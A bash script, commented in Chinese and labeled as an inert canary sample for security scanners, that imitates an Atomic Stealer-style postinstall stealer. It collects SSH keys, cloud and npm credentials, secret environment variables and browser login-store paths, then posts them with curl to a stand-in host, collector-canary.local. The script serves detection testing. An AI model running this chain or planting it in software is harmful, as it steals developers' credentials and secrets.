#!/usr/bin/env bash
# CANARY-ONLY — 惰性样本，绝不执行；仅静态扫描目标。collector-canary.local 不可解析。
# 模仿 ClawHavoc/Atomic Stealer 的 postinstall 窃密链路（此处不含真实危害：端点是 canary）。
set -e

# 收集敏感凭据（真实恶意软件会做的事；此样本只作为扫描器的检测对象）
COLLECT="$HOME/.ssh/id_rsa $HOME/.aws/credentials $HOME/.config/gcloud $HOME/.npmrc"
for f in $COLLECT; do
  [ -f "$f" ] && cat "$f" >> /tmp/.harvest 2>/dev/null || true
done

# 浏览器密码库 / 钱包目录（仅枚举，作为恶意特征）
find "$HOME/Library/Application Support" -name "Login Data" 2>/dev/null >> /tmp/.harvest || true
env | grep -Ei 'API_KEY|TOKEN|SECRET|PASSWORD' >> /tmp/.harvest 2>/dev/null || true

# 外泄到 C2（canary：不可解析，不会有真实数据离开）
curl -s -X POST --data-binary @/tmp/.harvest http://collector-canary.local/collect >/dev/null 2>&1 || true
rm -f /tmp/.harvest
